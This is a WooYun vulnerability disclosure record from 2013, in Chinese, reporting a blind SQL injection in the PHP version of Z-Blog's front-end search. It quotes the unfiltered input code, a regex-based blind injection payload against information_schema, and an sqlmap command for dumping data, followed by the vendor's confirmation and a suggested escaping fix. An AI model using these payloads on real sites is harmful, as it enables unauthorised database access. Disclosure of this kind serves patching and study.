{"id": 7267, "wybug_id": "wooyun-2013-037956", "wybug_title": "Z-Blog的php版前台正则SQL盲注漏洞", "wybug_corp": "Z-Blog", "wybug_author": "只发通用型", "wybug_date": "2013-09-24 12:02", "wybug_open_date": "2013-12-23 12:03", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-09-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-09-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-09-27：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2013-11-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-11-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-12-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-12-23：\t细节向公众公开  简要描述： 第二发...另外有点疑惑想问下你们的开发 详细说明：  问题出在/zb_system/function/c_system_common.php\nfunction GetVars($name,$type='REQUEST'){\tif ($type=='ENV') {$array=&$_ENV;}\tif ($type=='GET') {$array=&$_GET;}\tif ($type=='POST') {$array=&$_POST;}\tif ($type=='COOKIE') {$array=&$_COOKIE;}\tif ($type=='REQUEST') {$array=&$_REQUEST;}\tif ($type=='SERVER') {$array=&$_SERVER;}\tif ($type=='SESSION') {$array=&$_SESSION;}\tif ($type=='FILES') {$array=&$_FILES;}\tif(isset($array[$name])){\t\tvar_dump($array[$name]);\t\treturn $array[$name];\t}else{\t\treturn null;\t}}\nGET过来的数据木有经过过滤就进入dbsql.php里面查询在前台的搜索框里输入注入语句,h为可搜索到的字符 h%')  and 1)#\n\nand 1可以替换成SQL注入，这里使用正则盲注h%')and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA=\"zblog\" AND table_name REGEXP '^[a-z]' LIMIT 0,1))#\n\n一个个字符把数据读出来..手注太蛋疼 使用sqlmap \npython sqlmap.py -u 网站地址/search.php?q=能成功搜索到的字符 -p 能成功搜索到的字符 --prefix \"%')\" --suffix \")#\"\n\n\n\n\n我想弱弱问一句 为啥要把\\'转换回来.求注入的节奏？zblog/zb_system/function/c_system_base.php\nfunction _stripslashes(&$val) {\tif(!is_array($val)) return stripslashes($val);\tforeach($val as $k => &$v) $val[$k] = _stripslashes($v);\treturn $val;}if(get_magic_quotes_gpc()){\t_stripslashes($_GET);\t_stripslashes($_POST);\t_stripslashes($_COOKIE);}\n   漏洞证明：  \n\n\n\n   修复方案：  使用mysql_real_escape_string()或addslashes()对传入参数进行过滤，或者使用str_replace()对一些关键词进行替换。   版权声明：转载请注明来源 只发通用型@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2013-09-24 13:41 厂商回复： 非常感谢。把\\'转换回来是因为dbsql有addslashes()处理，可能dbsql没处理好。 最新状态： 2013-09-24：找到原因了，dbsql第197行是多余的，所以引起了所有的BUG；  ", "replys": "漏洞评价：\n评论\n     2013-09-24 12:06 |    \t\t只发通用型 \t\t\t( 实习白帽子  |\t\t\t        Rank:93 漏洞数:14        | 刷通用型奖金小号)\t\t \n  忘记写这是PHP版了    \n     2013-09-27 15:26 |    \t\t低调 \t\t\t( 实习白帽子  |\t\t\t        Rank:42 漏洞数:18        | .......)\t\t \n  楼主 别带着一个羊薅羊毛呀！！！！！    \n     2013-09-28 02:21 |    \t\tMosuan \t\t\t( 普通白帽子  |\t\t\t        Rank:449 漏洞数:175        | 尘封此号，不装逼了，再见孩子们。by Mosua...)\t\t \n  @只发通用型 洞主这是谁的小号？    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}